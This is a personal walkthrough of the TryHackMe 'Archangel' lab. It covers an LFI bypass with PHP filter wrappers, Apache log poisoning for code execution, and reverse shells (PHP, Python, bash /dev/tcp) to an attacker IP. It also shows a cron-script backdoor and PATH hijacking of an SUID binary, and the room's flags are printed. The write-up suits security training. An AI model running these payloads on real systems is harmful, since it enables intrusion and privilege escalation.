### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### HTTP

- ferox gives this

```
301        9l       28w      313c http://10.10.172.71/images
200      320l     1270w    19188c http://10.10.172.71/index.html
301        9l       28w      312c http://10.10.172.71/pages
301        9l       28w      312c http://10.10.172.71/flags
301        9l       28w      313c http://10.10.172.71/layout
```

/flags is a meme
/pages is blank and 
/layout is blank and contains js

- found another hostname on `index`
`mafialive.thm`

On adding this entry to the `/etc/hosts` file and visiting the page we get our first flag

`http://mafialive.thm/`
`thm{f0und_th3_r1ght_h0st_n4m3}`

- Runneing ferox on `mafialive.thm` we get

```
200        3l        3w       59c http://mafialive.thm/index.html
200       15l       21w      286c http://mafialive.thm/test.php

```

- `test.php` has a button which redirects us to `http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`
- On the machine page there was a hint of `LFI` to lets try to attack that

- On trying `http://mafialive.thm/test.php?view=/home` we get this error `Sorry, Thats not allowed` maybe there is some filtering so lets start up burp

- When using this payload i am not getting an error
```
/var/www/html/development_testing/mrrobot.php/....//....//....//....//etc/passwd
```

- wasted a day and gave up here - going for wrteup


- [[LFI - PHP wrapper]] this explains and this was used to get the 2nd flag

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```


```
┌─[glack@parrot]─[~]
└──╼ $echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4...............9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
```


```
    //FLAG: thm{explo1t1ng_lf1}
```

- Getting a reverse shell part was based on this source code 

```
 if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
```


1. The URI must NOT contain _‘../..’_
2. The URI MUST contain _‘/var/www/html/development_test’_


used the write for this understanding and bypass


    To break this rule, we can use **../../../../../var/log/apache2/access.log** to access the logs but since it includes **../../**, the first rule is not being satisfied and hence our attack doesn’t work. To fix this we can escape the first **/** by adding another forward slash so that it becomes **..//..//..//** and so on.


Below is a discription of the bypass


---

Capture a request in burp suite on the **/test.php** page and send it to repeater. Go to repeater and **replace** both, the GET request and the User-Agent with the respective lines and then click send:

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log HTTP/1.1****User-Agent: <?php system($_GET[‘cmd’])?>
```

---

- so i followed the steps, got an error and tried again
- Tried changed in both and single i.e. `test.php?view` and `user-Agent` , the one without the user agent worked

- i was able to get the contents of `/var/log/apache2/access.log` in the response

however we also need to put this into `User-Agent` field

```
0xAniket: <?php system($_GET['cmd']); ?>
```



- used another writeup ,
https://0xaniket.medium.com/tryhackme-archangel-walkthrough-a1ceecde753c

captured another request with the url

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log`


and it finally worked with this one

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id HTTP/1.1
Host: mafialive.thm
User-Agent: 0xAniket: <?php system($_GET['cmd']); ?>
```


- changing the `cmd` payload to `php -r '=fsockopen("10.17.24.189",9999);exec("/bin/sh -i <&3 >&3 2>&3");'`

- It was not working so i tested it with `which php`

```
GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=which%20php 
```


got an output in the response


```
/1.1" 200 1993 "-" "0xAniket: /usr/bin/php
```


tried all given methods in the writeup but didnt work so used another writeup

https://r4bb1t.medium.com/archangel-write-up-ce246e133cc4

here it first downloaded pentest reverse shell onto the target machine

- Used this wget command as `cmd` paylaod
```
wget http://10.17.24.189:8000/php-reverse-shell.php
```

- The file was downloaded on target machine , confirmed it using `ls`

```
0.17.24.189 - - [31/Aug/2023:21:30:17 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id HTTP/1.1" 200 1433 "-" "index.html
mrrobot.php
php-reverse-shell.php
php-reverse-shell.php.1
```


- accessed `http://mafialive.thm/php-reverse-shell.php` and got a shell

and the flag


```
www-data@ubuntu:/home/archangel$ cat user.txt
cat user.txt
thm{lf1_t0_rc3_1s_tr1cky}
```

### Priv ESC

- got rick rolled
```
www-data@ubuntu:/home/archangel/myfiles$ cat passwordbackup
cat passwordbackup
https://www.youtube.com/watch?v=dQw4w9WgXcQ

```

- found a cronjob
```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```

the contents are


```
cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```


```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.24.189",9990));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


as per writeup one line bash would work and we would get the `archangle` user shell


- added this to the `hellowolrd.sh` file 
```
www-data@ubuntu:/opt$ echo "bash -i >& /dev/tcp/10.17.24.189/9992 0>&1" >> helloworld.sh
<& /dev/tcp/10.17.24.189/9992 0>&1" >> helloworld.sh
```

- started a netcat listener on port 9992, waited for a minute and got a shell as archangel user and the flag
```
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```


### Priv ESC - root

- there is a backup binary in `archangel` user home directory 

```
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
```

however when running the binary we are given an error 

```
./backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory

```


- AGain used the write up here

so in the `backup` binary the `cp /home/user/archangel/myfiles/* /opt/backupfiles` here `cp` was running without absolute path and this is a misconfiguration 


we can create our our binary named `cp` and add out own path to the `PATH` environmental variable


- created a file named cp, `archangel@ubuntu:~$ echo "bash -i >& /dev/tcp/10.17.24.189/9990 0>&1" > cp`

`archangel@ubuntu:~$ chmod +x cp`

this didnt work so used the writeup text to put into `cp` i.e.

```
!#/bin/bash
/bin/bash
```

``` 
echo '!#/bin/bash' > cp

echo "/bin/bash" >> cp
```

- changed the `PATH` variable
```
archangel@ubuntu:~$ export PATH=$PWD:$PATH


archangel@ubuntu:~$ echo $PATH
echo $PATH
/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
```


- Now on running the `backup` binary we are able to get the root shell

```
archangel@ubuntu:~/secret$ ./backup	
./backup
/home/archangel/cp: 1: /home/archangel/cp: !#/bin/bash: not found
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
```

- and the flag

```
cat root.txt
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```